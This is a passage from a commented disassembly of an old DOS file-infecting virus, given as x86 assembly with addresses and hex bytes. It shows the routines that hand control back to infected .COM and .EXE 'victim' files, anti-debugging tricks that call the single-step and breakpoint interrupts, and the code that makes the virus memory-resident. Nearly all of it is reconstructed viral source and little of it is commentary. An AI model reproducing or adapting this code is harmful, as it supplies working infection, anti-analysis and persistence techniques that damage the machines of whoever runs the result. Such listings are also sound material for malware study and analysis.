	jmp	short l_1953		;-> ?			;18E2 EB 6F
	nop							;18E4 90

;================================================================
;	End of virus code - file *.COM
;----------------------------------------------------------------
l_18E5:	popf							;18E5 9D
	pop	ds						;18E6 1F
	pop	es						;18E7 07
	pop	cx						;18E8 59
	pop	bx						;18E9 5B
	mov	word ptr cs:[5B4h],100h	;l_1934 = victim IP	;18EA 2E: C7 06 05B4 0100
	mov	ax,es						;18F1 8C C0
	mov	word ptr cs:[5B6h],ax	;l_1936 = victim CS	;18F3 2E: A3 05B6
	call	s_16CA			;init registers		;18F7 E8 FDD0
	jmp	dword ptr cs:[5B4h]	;l_1934 -> run victim	;18FA 2E: FF 2E 05B4

					;<--- victim name
d_057F	db	'A:\SYS.COM'					;18FF 41 3A 5C 53 59 53
								;1905 2E 43 4F 4D
	db	0,'XE',0,'E',0					;1909 00 58 45 00 45 00
	db	9 dup (0)					;190F 0009[00]

;================================================================
;	ANTYDEBUG - make virus resident
;----------------------------------------------------------------
s_1918	proc	near
	cmp	ax,3000h					;1918 3D 3000
	jne	l_1925			;-> int 3		;191B 75 08
	call	s_17BB			;-> make virus resident	;191D E8 FE9B
	retn							;1920 C3
s_1918	endp

d_05A1	dw	 002Ah			;victim SS (rel)	;1921 2A 00
d_05A3	dw	 1388h			;victim SP		;1923 88 13

;================================================================
;	ANTYDEBUG - call int 3 (Breakpoint)
;----------------------------------------------------------------
s_1925	proc	near
l_1925:	mov	ax,3000h		;Flag register		;1925 B8 3000
	push	ax						;1928 50
l_1929:	call	dword ptr es:[0Ch]	;int 3 (Breakpoint)	;1929 26: FF 1E 000C
	cmp	ax,3000h					;192E 3D 3000
	jne	l_1929						;1931 75 F6
	retn							;1933 C3
s_1925	endp

d_05B4	dw	 0000h			;victim IP		;1934 00 00
d_05B6	dw	 000Bh			;victim CS (rel)	;1936 0B 00

;================================================================
;	Make virus resident
;----------------------------------------------------------------
s_1938	proc	near
	push	es						;1938 06
	call	s_1948			;-> INT 1 (single step)	;1939 E8 000C
	cmp	ax,0						;193C 3D 0000
	jne	l_1947						;193F 75 06
	call	s_1925			;-> INT 3 (Breakpoint)	;1941 E8 FFE1
	call	s_1918			;-> reside virus	;1944 E8 FFD1
l_1947:	pop	es						;1947 07

;================================================================
;	ANTYDEBUG - call int 1 = Single Step
;----------------------------------------------------------------
s_1948:	pushf							;1948 9C
	xor	ax,ax						;1949 33 C0
	mov	es,ax						;194B 8E C0
	call	dword ptr es:[4h]	;int 1			;194D 26: FF 1E 0004
	retn							;1952 C3
s_1938	endp

;================================================================
;	End of virus code - file *.EXE
;----------------------------------------------------------------
l_1953:	popf							;1953 9D
	pop	ds						;1954 1F
	pop	es						;1955 07
	pop	cx						;1956 59
	pop	bx						;1957 5B
	mov	ax,es						;1958 8C C0
	add	ax,10h			;relocating value	;195A 05 0010
	mov	dx,ax						;195D 8B D0
	mov	bp,word ptr cs:[5A1h]	;l_1921 = victim SS	;195F 2E: 8B 2E 05A1
	add	bp,ax						;1964 03 E8
	mov	ss,bp						;1966 8E D5
	mov	bp,word ptr cs:[5A3h]	;l_1923 = victim SP	;1968 2E: 8B 2E 05A3
	mov	sp,bp						;196D 8B E5
	mov	ax,dx						;196F 8B C2
	add	word ptr cs:[5B6h],ax	;l_1936 - CS relocation	;1971 2E: 01 06 05B6
	call	s_16CA			;init registers		;1976 E8 FD51
	jmp	dword ptr cs:[5B4h]	;-> run victim		;1979 2E: FF 2E 05B4

	db	20 dup (0)		;COM file stack		;197E 0014[00]

d_0612	label	byte						;1992h

seg_a	ends

	end	start
